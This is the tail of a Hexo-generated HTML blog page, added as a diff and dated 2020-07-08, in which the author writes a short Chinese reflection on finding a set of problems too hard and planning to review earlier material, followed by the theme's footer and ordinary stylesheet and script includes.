+<p>觉得挺难的，且不说一题没做出来，看着题解也模模糊糊的，很多知识都不大了解或者了解不深不懂运用，得查好多，而且不知道做了这步之后下一步要做什么、为什么。之前的知识扫得快，忘得也挺快的，一块一块来回看吧。</p>
+  
+    </div> 
+
+    
+        <!-- Division Line -->
+        <div class="division"></div> 
+    
+
+    <div class="post-info-wrapper">
+            
+                    <!-- Post Info -->
+                    <p class="post-date">2020-07-08</p>
+                    
+                    
+                        <p class="post-info-categories">
+                            
+                        </p>
+                    
+
+                    
+            
+    </div>
+</article>
+
+
+    
+
+            </main>
+
+            <!-- 'To Top' Btn-->
+            
+                <div id="to-top">
+    <a href="#top" class="toTop">
+        <i class="fa fa-pagelines"></i>
+    </a>
+</div>
+            
+
+            <!-- Footer -->
+            
+                <footer class="footer-wrapper col-xs-12 col-sm-12">
+    <div class="footer-banner-wrapper">
+        <p class="footer-banner">Powered by <a href="https://hexo.io/" target="_blank" rel="noopener" title="Hexo">Hexo</a></p>
+        <P class="footer-banner">Theme <a href="https://github.com/Lonezj/hexo-theme-wind" target="_blank" rel="noopener" title="Wind">wind</a></P>
+    </div>
+</footer>
+            
+        </div>
+
+        <link rel="stylesheet" href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.css">
+        <link rel="stylesheet" href="/css/google-prettify-monokai.css" type="text/css">
+        <script src="//cdn.bootcss.com/prettify/r298/prettify.min.js" type="text/javascript"></script>
+    </body>
+</html>
